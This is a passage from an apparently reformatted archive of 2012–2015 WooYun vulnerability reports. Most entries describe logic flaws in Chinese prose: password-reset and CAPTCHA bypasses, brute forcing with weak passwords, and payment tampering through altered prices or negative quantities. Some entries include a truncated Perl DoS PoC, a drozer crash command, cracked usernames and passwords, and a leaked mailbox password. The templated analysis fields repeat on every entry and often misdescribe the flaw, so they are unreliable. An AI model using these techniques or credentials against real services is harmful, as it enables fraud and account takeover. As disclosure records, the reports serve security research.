**详情**: 某手机厂商在自己的服务器上保存很多用户资料：通讯录、短信、位置信息等。但他们对用户的数据保护却做得很差。下午一位朋友的手机被他人锁定了，怀疑是账号被盗。简单测试，发现flyme的服务竟然可以猜解用户名，无限暴力破解。验证码直接绕过。。。用双拼音做用户名，123456、654321、111111这几个密码，可以破解出来不少账号。而登录flyme之后，竟然可以直接查看用户的通讯录、短信记录。甚至远程拍照、定位、发送消息、播放声音等。我和我的小伙伴都惊呆了。。

**POC**: Flyme:定位：通讯录和短信

**绕过**: 过滤绕过

**修复**: 先解决下暴力破解的问题吧
---

---
### [wooyun-2015-0100482] 安吉星客户端登录密码可以被随意篡改
**厂商**: 上海安吉星信息服务有限公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: （1）点击忘记密码后，服务器会发送一个验证码至手机。（2）此验证码同时也可以再网络数据中查看。（3）发送至手机中的验证码。（4）输入验证码及新密码，当然可以修改成功。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 完善验证策略，不要发送多余的信息
---

---
### [wooyun-2014-060356] 某社交平台某业务40000多元的产品瞬间变1元支付（支付漏洞）
**厂商**: 某社交平台某社交平台 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标站点：https://example.com/[已脱敏] 46900元 啊，好贵啊，能便宜点吗。。到这个页面了点击在线支付之后会出现一个确认支付如图就在这里我们开始抓包吧看看抓到的内容发现其实最后一项内容就是价格，我们改成1看看会怎么样之后提交哈哈看到了吗，40000多元的课程变成了一元钱，超值啊剩下我们只需要用某电商平台支付一下即可，由于身边没有某电商平台，就不演示了。。

**POC**: 扣费成功证明购买成功证明

**绕过**: 直接利用

**修复**: 严格检查表单
---

---
### [wooyun-2015-0150074] 神华宁夏煤业集团某系统设计逻辑缺陷导致信息泄露
**厂商**: 神华集团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 邮箱系统可爆破，获取员工邮件等敏感信息 http://**.**.**.**/使用网上人名单爆破，密码只试了123456成功登陆

**POC**: 邮箱系统可爆破，获取员工邮件等敏感信息 http://**.**.**.**/使用网上人名单爆破，密码只试了123456成功登陆

**绕过**: 直接利用

**修复**: 验证、次数限制
---

---
### [wooyun-2015-0139482] 七彩网支付逻辑漏洞可免费购物
**厂商**: 七彩 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 如上

**绕过**: 直接利用

**修复**: 验证
---

---
### [wooyun-2015-099747] 某就医网站逻辑缺陷致用户订单批量删除漏洞
**厂商**: 就医160 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题位置，在网站登录后用户中心 加号订单处点击删除 删除的请求 篡改此处的order_id 可以删除其他人的加号信息：简单测了一个 删除成功 返回1 ：这里测试使用了两个账号 一个账号可成功删除了另外一个账号的order_id 变量的信息 。

**POC**: 如批量遍历此订单编号 可大量删除该网站全国范围的预约加号信息造成网站的经济损失等

**绕过**: 直接利用

**修复**: 后台效验用户的会话权限
---

---
### [wooyun-2015-0126106] 金蝶医疗预约挂号通用平台支付漏洞
**厂商**: 金蝶 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 金蝶做医疗了，看流程确实很方便，某互联网公司挂号直接就诊，其它平台预约后，就诊当天还要去排队挂号，而且交费也不用排队哦。https://example.com/[已脱敏]

**POC**: 预约挂号，先选择科室，再选择医生，正常价格是22元在下一步提交的时候修改价格，fee=0.01&treatfee=0.1 这两个参数已支付成功

**绕过**: 直接利用

**修复**: 价格不从客户端提交的数据中取。
---

---
### [wooyun-2012-07740] WinRadius密码选项大小验证缓冲区溢出漏洞
**厂商**: 美加精英学校 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WinRadius 2009之前版本在实现上存在拒绝服务漏洞，WinRadius服务器绑定了udp端口1812和1813，但没有验证密码域的值的大小，在发送超过240个字符时，可造成服务器崩溃。

**POC**: Vulnerability found by demonalex, PoC:-----------------------------------------------------------#!/usr/bin/perluse Authen::Simple::RADIUS;$|=1;$host=shift || die "usage: $0 host\n";print "Launch Attack ... \n";$username=int(rand(10)).int(rand(10)).int(rand(10));$password='A'x241;$secret=int(rand(10

**绕过**: 直接利用

**修复**: 限制密码域接收变量的长度。
---

---
### [wooyun-2015-095846] 安全狗之上传绕过iis+apache版本通杀
**厂商**: 安全狗 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 将上传表单改为如下图所示即可bypass安全狗的拦截

**POC**: apache版本验证：iis版本验证：

**绕过**: 直接利用

**修复**: 这个你们自己懂。。
---

---
### [wooyun-2015-0137999] P2P金融安全之京金联某高危逻辑缺陷
**厂商**: jjlwd.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、重置密码处可绕过短信码校验，存在高危漏洞2、进行重置密码操作3、提交任意短信码4、返回响应包如下：5、修改响应包内容为：{"msg":true}6、释放后直接进入设置新密码页，重置密码成功

**POC**: 参见详细说明

**绕过**: 过滤绕过

**修复**: 完善认证校验机制
---

---
### [wooyun-2013-027074] 360安全卫士可被绕过（其他杀毒无法用此方法绕过）
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 正常木马报毒。  加入几个网站后 就不报毒了。

**POC**: 就打开了几个 大的网站 他就不报毒了  那么别人用远控 源码免杀 只要访问下这几个大网站就免杀了啊。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-079123] 辉煌国际饭卡可被无限复制篡改从而可免费吃饭（射频卡设计安全隐患）
**厂商**: 九鼎辉煌 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过之前的多次消费数据对比，获知的信息如下，有效数据存储区域为第08扇区，大致如下图为刚开卡时的数据内容，有效金额为20.00，2000其16进制为07 D0首先通过加密算法缺陷可以获取其全扇区的内容，分析对比可以篡改卡的数据，首先是克隆已知卡。读取原始卡的数据，其08扇区数据内容如下剩余金额为0A8C=2700 即27元。将该卡获得的数据写入到两张空白卡（可改写uid的）里，标号为1号、2号如图测试三张卡的余额如下图（漂亮妹子看到我的卡说，这个卡也可以刷么。"可以，不信你看"）测试发现，每张卡都可以消费，而且剩余金额互不影响。所以如果三张卡都可以消费，而且消费的金额超过了27元那肯定是存在缺陷的。三张卡的消费如图吃的麻辣香锅，价格为23元（菜加一碗米饭）+1元（一碗米饭）1.1号卡刷了10元，清单如下，剩余金额为17元。2.2号卡刷了14元，剩余13元，如下图3.原始卡消费了3次，第一次

**POC**: 如上详细描述

**绕过**: 直接利用

**修复**: 全加密、卡换cpu卡
---

---
### [wooyun-2013-018243] 某电商平台网一处业务设计逻辑漏洞可导致欺诈成功
**厂商**: 某电商平台网 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 大概的流程如下买家A在某电商平台网上购买了卖家B的商品，进而发现卖家B没有发货或者是其他原因，A申请退款，B可以立即拒绝，这个时候，卖家立即拒绝（经过试验可以用程序自动拒绝，漏洞！），而买家A只有3天的时间（这个时间是从发起退款申请那一刻计算的）来处理卖家拒绝的退款申请。但是，某电商平台客服介入也是三天时间，而某电商平台还有一条规定是，当卖家拒绝退款申请的时候“卖家没有接受申请，请您及时处理，逾期将自动撤销申请。”，这个时间也是3天，理论上是同一个时间的，也就是说你如果没有在三天内进行处理，那么这个申请也会被撤销。如果卖家一直拒绝，那么就会导致一个“退款申请逾期”的问题，导致客服介入之前就“逾期”了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们自己懂？
---

---
### [wooyun-2015-0142682] 某办公系统设计逻辑缺陷（内部信息泄露）
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网址：http://**.**.**.**/一、登陆处可撞库。验证码认证机制存在问题，只要CheckCode和txtAuthcode参数一致就行，用常用用户名和弱口令123456，可获得一个有效账号，登陆后可进行个人办公、行政办公、公文管理、信息管理、人事管理等；二、可向任意手机号码发送手机短信；三、可查看二千多名人员信息（含姓名、职务和手机号）。爬取用户名，再按第一步中跑，得到50个有效账号。chenlingzbaohaipniyongyhuangzhjiangyhqianwyyangmlzhaojqfangjgwangqymywufhqtkeyjwsjgxywsjyddfbywmfwsjcyrwsjlzpwsjwyhwsjqyjwsjbchwsjwlxwsjsqywsjwlrwsjyrxwsjzcwwsjoyywsjwmmwsjycjwsjzlmwsjyszfanyfchuyywsjj

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2015-0157783] 金正大集团某系统设计逻辑缺陷导致内部信息泄露
**厂商**: 金正大生态工程集团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 金正大生态工程集团股份有限公司成立于1998年，主导产品为复合肥、缓控释肥、水溶肥及其它新型肥料，是全球最大的缓控释肥生产基地。现有总资产110亿元，员工10000余人，年生产能力700万吨。2010年，公司在深圳证券交易所上市（股票代码002470）。2014年实现销售收入135.5亿元，2015年上半年实现销售收入96.97亿元。公司收入还不错 来个礼物可好？ 哈哈哈说正事漏洞地址：http://**.**.**.**/defaultroot/login.jsp无验证码可爆破：好几个弱口令 （密码123456）liyang 成功登录：职位，领导信息：在线人员：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2015-0109493] 37游戏设计缺陷导致可绕过验证码进行撞库
**厂商**: 37游戏 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先来到37主页www.37.com，然后可以看到登陆的地方是没有验证码限制的心想37这种大型网站安全不可能做的这么次吧，应该是输错几次之后才会出验证码，故意输错用户名和密码多次后验证码确实出来了验证码出来了就试试能不能绕过吧，先burp抓包，可以看到用户名和密码全部明文传输的接下来repeater下go几下后forward，可以看到已经抓包的验证码重放后还是返回验证码是正确的这种验证码问题出现在很多大型网站上，验证码输出正确一次之后全部会是正确的，验证码形同虚设，只是验证码绕过的话如果用户名和密码密文传输那么还不能撞库，用户名和密码全部是明文传输，直接可以撞库，这里看到了已经撞出了几个用户就停了，证明一下选两个登陆一下看看全部登陆成功37游戏网是大型知名游戏网站，如果用这种方法撞库出很多用户然后发布到互联网或者是盗取游戏装备，那么影响也是很大的吧，之前的12306事件不就是撞库出来的用户

**POC**: rs

**绕过**: 过滤绕过

**修复**: 增强验证机制
---

---
### [wooyun-2015-0128178] 米牛网逻辑缺陷导致短信验证被绕过可任意重置用户密码
**厂商**: 杭州米云科技有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.注册时只需要手机号及验证码，且手机号为登陆用户名之一。可在注册页面遍历手机号是否注册。2.已7574结尾的手机号发送修改密码请求，并用burpsuite抓包，发现在提交修改密码的数据包中有验证码。3.将此包放入repeater为重放做准备，并将正常数据包放过观察正常改密的返回结果。4.将验证码及cookie去掉后进行回放，发现返回包没有变化。5.利用123123这个密码登陆发现登陆成功。

**POC**: 1.将手机号改为尾号为3394的手机号进行数据包重放，发现返回包同样相同。2.利用123123这个密码登陆尾号为3394手机号的账号，发现同样成功。

**绕过**: 直接利用

**修复**: 在更改密码逻辑中真正加入对短信验证码的验证。
---

---
### [wooyun-2014-072593] 某运营商某分站支付漏洞(已成功)
**厂商**: 某运营商 | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: photo.189.cn以前报了一个金钱任意冲漏洞刷了150。竟然没清理。继续看看。。结果。。随便点了两个东西。把数量改为-5。成功了。

**POC**: 竟然发货了！快递单号都发来了。我就想问问审核人员，那-5是怎么给发的货。电信大度点那个镯子就当礼物好了。送妹子⊙▽⊙不要查水表啊查水表！

**绕过**: 直接利用

**修复**: 加强审核人员算数，建议补一补数学，挺有用的。
---

---
### [wooyun-2013-036729] Winrar压缩包管理器DLL劫持
**厂商**: WinRAR | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网络上存在众多单独语言版本的Winrar压缩包管理器，也是我们常用使用的一款软件例如：中文版，简体版，繁体版等等的Winrar压缩包管理器单独语言版本的Winrar压缩包管理器，都不存在rarlng.dll这个DLL文件（RarLng.dll------注释：语言资源）但是单独语言版本的Winrar压缩包管理器存在打开任何文件格式为rar或zip的压缩包时，都会加载一个不存在的DLL文件rarlng.dll假如Winrar压缩包管理器默认安装路径为C:\Program Files\WinRAR这时只要在上面路径放入自制的任意内容名为rarlng.dll的DLL文件，那么这台计算机上打开任何一个rar或zip压缩包都会rarlng.dll这个DLL文件。（我这里放入特定的dll后，打开irenh一个压缩包会弹出一个特定的框显示"Hello from MyDLL!"，如下图）

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2012-011901] 我查查某功能无限发送短信
**厂商**: wochacha.com | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 快递注册这里：https://example.com/[已脱敏] https://example.com/[已脱敏]

**POC**: 手机截图麻烦，不弄了

**绕过**: 直接利用

**修复**: 限制一下频率和总数量，比如一个号码每天只能3条
---

---
### [wooyun-2015-0132193] 大朴网主站商城支付逻辑漏洞（附上2种神奇方式）
**厂商**: 大朴网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ============================================第一种神奇方式==============0x 1首先来看看床嘻嘻 （男人嘛）0x 2选择加入购物车之后呢 ，神奇的事情发生了，居然数量可以选择+ -哈哈 （我就是顺手一点减号）结果呢就是这样啦0x 3选择去结算，结果是这样的（商品金额为0了 ，只剩下邮费）0x 4来看看订单提交成功没？ 答案肯定的=========================================第二种神奇方式=======0x 1接着上面的订单 我要把邮费都去掉 嘻嘻（奸诈o(∩_∩)o ）选择去付款0x 2使用必杀软件brup （duang一下改完 全部改为1.00）0x 3来看看效果 哈哈哈两种方式共同打造支付逻辑漏洞

**POC**: ============================================第一种神奇方式==============0x 1首先来看看床嘻嘻 （男人嘛）0x 2选择加入购物车之后呢 ，神奇的事情发生了，居然数量可以选择+ -哈哈 （我就是顺手一点减号）结果呢就是这样啦0x 3选择去结算，结果是这样的（商品金额为0了 ，只剩下邮费）0x 4来看看订单提交成功没？ 答案肯定的=========================================第二种神奇方式=======0x 1接着上面的订单 我要把邮费都去掉 嘻嘻（奸诈o(∩_∩)o ）选择去付款0x 2使用必杀软件b

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0136129] 某家电厂商内部邮箱密码泄露及某处逻辑支付漏洞(影响公司财产安全)
**厂商**: 某家电厂商商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.这是由于官方忽略漏洞导致的:WooYun: 某家电厂商某站弱口令导致5000+员工信息暴露(姓名/工号/身份证/电话/邮箱/专业/职位等...)最下面有这张图片可以看到邮箱用户名为 lexue@某公司邮箱.com密码为 1qazXSW@2.尝试登录此邮箱地址 https://example.com/[已脱敏] /DRP/shopping/toBalanceShoppingCart HTTP/1.1Host: ego.tcl.com.cnUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gec

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 发现订单价格异常，可以直接报错，拒绝继续运行
---

---
### [wooyun-2015-0151333] DZ棒棒团某功能设计逻辑缺陷（可免费观看VIP视频）
**厂商**: dz棒棒团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 班班网是一家discuz教程为主的在线教程网站，vip收费要好几千块钱，不小心获取到vip视频了。班班网用的是极酷阳光播放器，打开一个免费视频用谷歌浏览器查看network视频加载发现免费教程视频路径https://example.com/[已脱敏]

**POC**: 这个就是批量获取到的vip视频地址啦

**绕过**: 直接利用

**修复**: 改下那个php文件名？自己修复下吧，俺是新手，不懂~
---

---
### [wooyun-2015-0122148] 向上某安全厂商某功能逻辑缺陷可以任意重置用户密码
**厂商**: 京证大向上金融信息服务有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天测试p2p登录安全，找到向上360这个平台，短信改密这块测了很长时间没有突破。后来发现可以通过邮箱登录及利用邮箱更改密码。顺手测了一下...发现邮箱改密这块逻辑存在漏洞，可以绕过邮箱验证重置用户密码。1.登录页面及注册处无法遍历邮箱名，如图：注册处只能用手机号注册，同样无法遍历邮箱，如图：这样只能通过暴力破解来获得邮箱名了..2.忘记密码处却可以通过邮箱来重置密码，如图：3.注册两个测试账号，分别绑定邮箱，如图：尾号为574，邮箱为m打头的163邮箱：尾号394，邮箱为f打头的163邮箱：

**POC**: 1.改密开始，使用尾号为574的账号，发送邮件进行重置密码，如图：2.登录m打头的163邮箱，找到重置密码的邮件，并复制连接，进行重置密码并抓包，如图：发现里面有randomcode及referfer和cookie，先看下正常的返回结果，如图：1>请求包2>响应包3.讲请求包进行回放，并且去掉referer和randomcode，并把密码再改一次为123.com，发现返回包没有变化，如图：用123.com这个密码进行登录，成功。如图：4.将账号换成f打头的163邮箱进行测试，发现同样成功（密码改为123qwe），如图：用123qwe这个密码对f打头163邮箱的账号进行登录，成功。如图：

**绕过**: 过滤绕过

**修复**: 重置密码逻辑中加入对邮箱验证码的验证。
---

---
### [wooyun-2014-067720] 某电商平台转存存在逻辑漏洞
**厂商**: 某电商平台 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 发现这个漏洞的经过是这样的，昨天我从某电商平台上买了件东西，卖家退了10元到了我的某电商平台账号里去了，然后我想把退的这10元钱转到银行卡里去，于是我打开某电商平台转钱。大家都知道转钱需要一定的时间，在这个时间里我去了卡盟 ，想开个会员，但是卡盟里已经没钱了，我又用某电商平台向卡盟里存钱，发现某电商平台里的10元还在，于是用这10元往卡盟里存了12元。直到今天我打开某国有银行的网址想看看还剩余多少钱，当我打开明细的时候发现昨天的10元钱转到银行卡里去了，但卡盟的钱依然还在。今天我不相信又试了一次，试了2元，但结果和昨天一样。这样有盗钱危险！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不知道修复方式。
---

---
### [wooyun-2014-084180] 某视频网站网某后台验证码绕过(破解管理员两枚)
**厂商**: 某视频网站 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某视频网站土豆第三方素材替换平台：http://[IP已脱敏] 验证码可绕过这是很多公司外网暴露的系统存在的通病，看起来有验证码，实际多数都可绕过、可逆向、可识别。此站点，固定Cookie中JSESSIONID和参数code的值，即可进行暴力破解。2. 提示信息过详细不存在的用户和存在的用户，提示不一样，攻击者轻易猜解出哪些用户是存在的。（指数级减小了破解尝试次数）此处存在的用户，提示“用户名或密码错误，请重新输入”不存在的用户，则提示“您没有该系统权限，请联系管理员！”挂个小字典，很快即可小范围锁定用户名列表，我跑出来少量用户：adminjintuotudouyoukuzhousu利用密码字典再跑一遍，命中用户：tudou，密码tudou123456youku, 密码youku888

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 一点建议：1. 验证码使用一次，立即过期2. 强化用户密码3. 条件允许，对敏感系统做二次验证
---

---
### [wooyun-2012-016160] Shopex旗下产品Ecmall支付漏洞
**厂商**: ShopEx | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 最近在用ecmall搭建一个站点，却发现这坑爹的功能，哪能否送我个ECMALL的商业授权呀。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个，你比我懂啊。
---

---
### [wooyun-2015-0120522] 团贷网Android客户端明文手势密码+拒绝服务
**厂商**: tuandai.com | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.手势密码可本地获取，明文显示文件路径/data/data/com.junte/shared_prefs/SharedPreference.xml.xml对应手势密码为2.客户端本地拒绝服务客户端暴露activity：cn.jpush.android.ui.PushActivity发送Intent启动会导致运行中的客户端直接闪退奔溃退出验证：dz> run app.activity.start --component com.junte    cn.jpush.android.ui.PushActivity

**POC**: 见上文

**绕过**: 直接利用

**修复**: 1.加个密可好2.设置export为false，或者在代码中添加try-catch捕获异常
---

---
### [wooyun-2012-011244] 上海清橙购物网站存在严重支付漏洞
**厂商**: 上海青橙 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.老规矩，站点如下：https://example.com/[已脱敏]

**POC**: 4.买个便宜的吧，Mars1白色，只需499元，更便宜啦！加入到购物车：5.这个时候，加上代理，操上burp suite，看下支付的数据，这里是GET方式提交给服务器的，抓包如下GET /addtocart.aspx?qty=1&pid=1427&color=%u82F9%u679C%u7EFF HTTP/1.1这里当然pid应该是商品的编号，服务端根据这个pid，从数据库中查询出价格，所以这里确实是改不掉金额了。不过话说是不是可以改成其他的pid呢？qty是购买手机的个数。这里改成-1啦！如下6.看看购物车里面的情况吧！7.点击确认结账了，生成的最终订单只需110元哦，这个数字不吉利啊！我不

**绕过**: 直接利用

**修复**: 1.像金额这样的信息不要放在页面上，确实有随时被篡改的风险，这些信息本来就在数据库中，可以定义一个字符型的字段代替金额的传输，或者直接由商品唯一标识来查询数据库得到金额；2.签名校验是最重要的了，将购买的商品、数量、金额（或替代字段）、订单的ID号生成一个校验字符串。在每次数据传输的过程中进行校验，
---

---
### [wooyun-2014-053054] 杭州纬聚网络有限公司旗下网站严重支付漏洞
**厂商**: 杭州纬聚网络有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 具体为，又拍云存储存在购买空间和流量验证不严格的支付漏洞。在初次购买时，选择一定量的流量，拦截发送数据，进行修改，将流量的值设置为超大，具体未测试，之后选择支付，则费用会变的很低。如图拦截数据，并修改flow然后选择支付价格，变为9.5元，正常的话应该上百吧然后结果如图购买后的空间是可以使用 ，如下漏洞成因是，后台支付验证逻辑有问题，建议修复。另外，我刷了10000000G的流量也用不完，如若收回请私信我获取我的订单id，我发现又拍云加速真的不错，网站存储的图片打开很快。望厂商积极修复，赠送我点空间啊，我要的空间不大，流量也不多。

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 请程序员喝茶！
---

---
### [wooyun-2014-088583] 微店网密码找回逻辑漏洞
**厂商**: 微店网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先进入找回密码界面。https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 为何不验证一下？
---

---
### [wooyun-2014-051242] 微电聊注册系统存在业务逻辑缺陷可导致服务被滥用
**厂商**: 微电聊 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于微电聊对某互联网公司绑定手机这一注册过程未做严格的业务逻辑处理，导致某互联网公司帐号可绑定任意手机号，从而造成服务滥用。1.这是一个业务逻辑问题；2.漏洞可被利用作为骚扰电话，让通讯双方都崩溃；3.也可以帮微电聊迅速烧钱；

**POC**: 1.某互联网公司用户A，发送指令zc18411111111到 微电聊 公众号进行注册；2.回复微电聊189222222223.微电聊会呼叫18411111111，接通后，继续呼叫18922222222Nokia1050，没法截图。4.18411111111和18922222222可以正常通话了

**绕过**: 直接利用

**修复**: 绑定手机号时要验证啊！当然，也许你不认为这是一个安全问题……但总得修复吧~
---

---
### [wooyun-2014-085626] MSSQL2000链接服务器的密码破解为明文的漏洞（附POC）
**厂商**: Microsoft | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

